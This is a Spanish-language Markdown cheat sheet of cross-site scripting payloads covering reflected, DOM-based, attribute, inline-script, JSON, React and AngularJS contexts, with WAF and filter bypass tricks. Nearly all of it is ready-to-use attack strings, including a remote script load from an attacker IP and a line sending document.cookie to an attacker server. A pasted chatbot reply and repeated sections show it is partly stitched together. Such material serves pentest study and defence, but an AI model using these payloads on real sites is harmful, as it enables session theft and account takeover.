
---

**Nota:** Ver [4. Fases](4.%20Fases.md)
# Tipos de payloads para XSS

**XSS Reflejado (Reflected XSS)**  

Los siguientes payloads están diseñados para ejecutarse cuando la entrada del usuario se refleja directamente en la respuesta HTML sin una sanitización adecuada. Se usan típicamente en formularios de búsqueda, URLs o parámetros GET/POST.

---

**Payload básico usando etiquetas `<script>`**  
Ideal para probar si se permite la ejecución directa de scripts.

```html
<script>alert(0)</script>
````

---

**Payload con etiqueta `<img>` y atributo `onerror`**  
Útil cuando las etiquetas `<script>` están filtradas pero se pueden inyectar atributos en imágenes u otros elementos HTML.

```html
<img src=/ onerror=alert(0)>
```

---

**Payload con cierre de atributo HTML y ruptura de contexto**  
Este tipo intenta romper la estructura del HTML existente y ejecutar código JavaScript dentro de un atributo.

```html
#"><img src=/ onerror=alert(0)>
```

---

**Payload que accede a cookies**  
Comprobación básica para ver si se puede acceder al `document.cookie`, que puede permitir el robo de sesiones.

```html
<script>alert(document.cookie)</script>
```

---

**Payload con `<img>` para acceder a cookies sin `<script>`**  
Versión alternativa para evadir filtros de etiquetas `<script>`.

```html
<img src=/ onerror=alert(document.cookie)>
```

---

**Payload combinado con ruptura de contexto y acceso a cookies**  
Diseñado para bypass en casos donde haya filtrado parcial o se necesite alterar el flujo del HTML.

```html
#"><img src=/ onerror=alert(document.cookie)>
```

---

**Payload que accede a cookies**  
Comprobación básica para ver si se puede acceder al `document.cookie`, que puede permitir el robo de sesiones.

```html
<script>alert(document.cookie)</script>
```

---

**Payload con inclusión de script externo**  
Este payload escapa del contexto HTML (`">`) e inserta una etiqueta `<script>` que carga un archivo malicioso remoto. Es útil para pruebas más realistas, ya que permite ejecutar código JavaScript alojado en nuestro servidor de control.

```bash
"><script src="http://IP_ATACANTE/pwned.js"></script>
```

**Nota:**  Normalmente este tipo de payloads se usan junto con un servidor HTTP (por ejemplo con `python3 -m http.server 80`), para entregar el archivo `pwned.js` y capturar su ejecución cuando la víctima carga la página

---

## XSS en Contextos Específicos

Estos payloads están diseñados para situaciones donde la entrada del usuario no se refleja directamente en el cuerpo HTML, sino dentro de atributos, scripts embebidos, estructuras JSON, o incluso código JavaScript inline. Son muy útiles en aplicaciones modernas con frameworks JS o sanitizaciones parciales.

---

**Payloads dentro de atributos HTML (`input`, `img`, `a`, etc.)**  
Cuando tu entrada aparece dentro de un atributo como `value="..."`, necesitas cerrar el atributo y añadir un evento malicioso.

```html
" autofocus onfocus=alert(1) x="
````

```html
' onmouseover=alert(1) '
```

```html
" onerror=alert(1) src=x
```

---

**Payloads dentro de JavaScript inline**  
Si tu input aparece dentro de un bloque `<script>`, especialmente dentro de variables JS, deberás romper la cadena y ejecutar tu código.

```js
';alert(1);// 
```

```js
";alert(1);// 
```

```js
');alert(document.domain);//  
```

---

**Payloads en HTML dentro de `event handlers` JS (ej: onclick, onmouseover)**  
Si el input se inyecta dentro de código JS de eventos, puedes intentar escapar la cadena y ejecutar tu propio código.

```js
" onmouseover="alert(1)
```

```js
');this.onerror=null;alert(1);//
```

---

**Payloads dentro de objetos JSON**  
Cuando la aplicación refleja tu input en un JSON, especialmente en respuestas de APIs, se necesita cerrar la estructura de forma controlada para insertar JS.

```json
"});alert(1);//
```

```json
"}]}]});alert(1);// 
```

```json
{"user":"admin<script>alert(1)</script>"}
```

---

**Payload usando SVG y otros elementos válidos HTML5**  
Algunos filtros permiten etiquetas SVG u otras menos comunes. Son útiles para evadir filtros anti-`<script>`.

```html
<svg/onload=alert(1)>
```

```html
<details open ontoggle=alert(1)>
```

```html
<marquee onstart=alert(1)>
```

---

**Payloads utilizando técnicas de obfuscación**  
Algunos WAFs o filtros pueden bloquear `alert`, `onerror`, etc. Puedes usar técnicas para ofuscar el código y evadir la detección.

```html
<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

```html
<iframe srcdoc="<script>top </script>"></iframe>
```

```html
<svg><script>//--><script>alert(1)</script>
```

---

**Recomendación**: Siempre analiza el contexto exacto donde se refleja tu entrada usando las herramientas de desarrollo del navegador (F12). Una misma entrada puede necesitar un payload completamente distinto dependiendo del lugar donde se inyecta (atributo, texto, JSON, JS, etc.).

**Nota:** Recuerda siempre revisar el código fuente de la respuesta para entender en qué contexto se inserta tu payload (HTML, atributo, JavaScript inline, etc.). Esto te permitirá adaptar mejor el vector de inyección.

---

**XSS basado en el DOM (DOM-based XSS)**  

Este tipo de XSS ocurre cuando el navegador interpreta datos manipulados por JavaScript, como `document.location`, `document.URL`, `location.hash`, etc., sin validarlos correctamente. La inyección no se refleja directamente en el HTML, sino que se ejecuta mediante el DOM en tiempo real.

---

**Ejemplo de uso típico en URLs con `location.hash`**  
El JavaScript de la página lee el hash y lo inserta en el DOM sin sanitizar.

```url
https://example.com/#<img src=x onerror=alert(1)>
````

---

**Payload con `location.search`**  
Cuando el parámetro GET se utiliza directamente en el DOM por JavaScript vulnerable:

```url
https://example.com/?msg=<svg/onload=alert(1)>
```

---

**Payloads para manipulación de `document.write` o `innerHTML`**  
Si el JS hace algo como:  
`document.write(location.hash);`  
puedes inyectar directamente HTML/JS:

```url
https://example.com/#<script>alert(1)</script>
```

---

**Payload con manipulación de parámetros usados por funciones JS**  
Si el código hace algo como:  
`var name = new URLSearchParams(location.search).get("user");`  
`document.getElementById("msg").innerHTML = "Hola " + name;`

Entonces puedes usar:

```url
https://example.com/?user=<img src=x onerror=alert(1)>
```

---

**Uso de `javascript:` URI en elementos que permitan `href`**  
Algunos enlaces pueden permitir `javascript:` como esquema.

```html
<a href="javascript:alert(1)">Haz clic</a>
```

O directamente en la URL si hay un redireccionamiento o uso de `href` sin validación:

```url
https://example.com/?url=javascript:alert(1)
```

---

**Uso de `data:` URI con contenido HTML embebido**  
Técnica avanzada para inyectar contenido en navegadores que permiten `data:`.

```html
<a href="data:text/html,<script>alert(1)</script>">Click</a>
```

---

# Técnicas de bypass y evasión de filtros (WAF / sanitización parcial)

**Obfuscación de `alert()`**

```html
<script>eval('al' + 'ert(1)')</script>
<script>Function("ale"+"rt(1)")()</script>
```

---

**Escape de caracteres con entidades HTML**

```html
<script>alert&#40;1&#41;</script>
<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
```

---

**Bypass de filtros anti-`script`**

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

---

**Uso de eventos poco comunes**

```html
<video oncanplay=alert(1)>
<keygen autofocus onfocus=alert(1)>
```

---

**Uso de comentarios HTML para romper filtros**

```html
<script><!-- -->alert(1)//--></script>
```

---

**Uso de técnicas multilinea**

```html
<scr
ipt>
alert(1)
</scr
ipt>
```

---

**Uso de iframes y `srcdoc`**

```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

---

**Recomendación final**:  
En DOM-based XSS no basta con ver si el payload se refleja. Debes revisar si el código JavaScript en la página manipula tu entrada sin sanitizarla. Usa extensiones como **DOM Invader** (de Burp Suite) o inspecciona el JS manualmente con DevTools (F12 → pestaña "Sources").

Perfecto. Aquí tienes la **segunda parte** de tu cheat sheet `.md`, centrada en **contextos específicos de XSS** modernos: atributos, JavaScript inline, JSON, frameworks como React y Angular, y otros entornos comunes en aplicaciones actuales.

---

# XSS en Contextos Específicos

**XSS en atributos HTML**  
Cuando la inyección ocurre dentro del valor de un atributo como `src`, `href`, `title`, etc.

```html
"><img src=x onerror=alert(1)>
" onmouseover=alert(1) x="
javascript:alert(1)
````

**Tips:**

- Busca entradas dentro de atributos de etiquetas (`<a href="...">`, `<img src="...">`).
    
- Prueba romper el atributo con `"`, luego inyectar evento (`onerror`, `onmouseover`, etc.).
    

---

**XSS en JavaScript inline (contexto de script)**  
Cuando tu input aparece dentro de código JavaScript de la página.

```html
<script>var nombre = 'PAYLOAD';</script>
```

**Payloads adaptados:**

```javascript
';alert(1);// 
';document.location='https://tu-servidor.com?c='+document.cookie;//
"+alert(1)+"
```

**Tips:**

- Identifica si el input está entre comillas simples, dobles o sin comillas.
    
- Usa `console.log()` para probar en DevTools si no puedes usar `alert()`.
    

---

**XSS en contenido JSON**  
Frecuente en APIs REST que devuelven estructuras JSON con datos reflejados.

```json
{"mensaje": "TU_INPUT"}
```

**Payloads posibles:**

```json
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
</script><script>alert(1)</script>
```

**Tips:**

- Observa si el JSON se inyecta posteriormente en el DOM vía JavaScript.
    
- Usa `Burp Repeater` para modificar la respuesta de la API y ver si hay renderizado directo.
    

---

**XSS en aplicaciones React (JSX)**  
React escapa automáticamente caracteres peligrosos, pero hay excepciones con `dangerouslySetInnerHTML`.

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Payload (si hay innerHTML):**

```html
<img src=x onerror=alert(1)>
<script>alert(1)</script>
```

**Tips:**

- Busca si el input se renderiza con `dangerouslySetInnerHTML`.
    
- En React, es raro que haya XSS directo a menos que el desarrollador use `eval()`, `innerHTML` o manipule el DOM.
    

---

**XSS en AngularJS (1.x)**  
AngularJS permite expresiones con doble llave (`{{ }}`) que pueden ejecutarse si están mal protegidas.

```html
{{constructor.constructor('alert(1)')()}}
{{alert(1)}}
```

**Tips:**

- Busca puntos donde aparezca `{{ tu_input }}` directamente.
    
- Versión 1.x es especialmente vulnerable si no hay sanitización.
    

---

**XSS en eventos HTML comunes**  
Puedes usar eventos menos filtrados que `onerror`, como:

```html
onmouseover=alert(1)
onclick=alert(1)
onfocus=alert(1)
onmouseenter=alert(1)
```

**Ejemplo:**

```html
<a href="#" onclick=alert(1)>Haz clic</a>
```

---

**XSS a través de enlaces (`href="javascript:"`)**  
Algunos sitios permiten inyectar `javascript:` en `href`.

```html
<a href="javascript:alert(1)">Haz clic aquí</a>
```

**Tips:**

- Algunos navegadores modernos bloquean `javascript:` por seguridad, pero sigue siendo útil en navegadores antiguos o filtros débiles.

---
